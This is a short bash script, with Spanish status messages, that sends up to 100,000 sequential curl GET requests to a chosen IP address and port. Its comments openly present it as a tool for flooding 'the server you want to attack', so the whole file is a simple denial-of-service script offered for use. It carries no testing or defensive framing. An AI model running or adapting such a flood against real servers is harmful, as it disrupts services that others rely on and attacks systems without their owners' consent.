#!/bin/bash

IP_ADDRESS="127.0.0.1"                  # Change this to the IP address of the server you want to attack
PORT=80                                 # Change this to the port number of the server you want to attack
NUM_REQUESTS=100000                     # Change this to the number of requests you want to send

for ((i = 1; i <= $NUM_REQUESTS; i++)); do
    echo "Enviando solicitud GET $i a la dirección IP $IP_ADDRESS"
    curl -sS "http://$IP_ADDRESS:$PORT"                                   # -sS flag to hide the progress bar
    echo "Respuesta recibida para solicitud $i"
done
